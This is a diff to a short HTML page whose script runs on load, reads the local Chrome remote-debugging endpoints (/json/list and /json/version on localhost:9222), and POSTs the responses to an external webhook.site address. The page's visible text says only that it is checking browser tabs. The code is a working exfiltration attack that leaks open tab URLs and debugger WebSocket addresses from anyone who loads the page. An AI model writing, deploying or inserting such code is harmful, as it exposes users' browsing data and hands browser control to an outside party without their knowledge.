@@ -1,23 +1,30 @@
 <!doctype html>
 <meta charset="utf-8">
-<pre id="out">Testing browser...</pre>
+<pre>Checking browser tabs...</pre>
 <script>
 (async () => {
   const hook = "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";
+  const urls = [
+    "http://localhost:9222/json/list",
+    "http://localhost:9222/json/version"
+  ];
 
-  async function report(x) {
-    document.getElementById("out").textContent = x;
+  for (const url of urls) {
     try {
-      await fetch(hook, {method:"POST", mode:"no-cors", body:x});
-    } catch(e) {}
-  }
-
-  try {
-    const r = await fetch("http://localhost:9222/json/version");
-    const t = await r.text();
-    await report("DEBUG_ENDPOINT: " + t);
-  } catch(e) {
-    await report("DEBUG_ENDPOINT_ERROR: " + String(e));
+      const r = await fetch(url);
+      const body = await r.text();
+      await fetch(hook, {
+        method: "POST",
+        mode: "no-cors",
+        body: url + "\nHTTP " + r.status + "\n" + body
+      });
+    } catch (e) {
+      await fetch(hook, {
+        method: "POST",
+        mode: "no-cors",
+        body: url + "\nERROR: " + String(e)
+      }).catch(() => {});
+    }
   }
 })();
 </script>
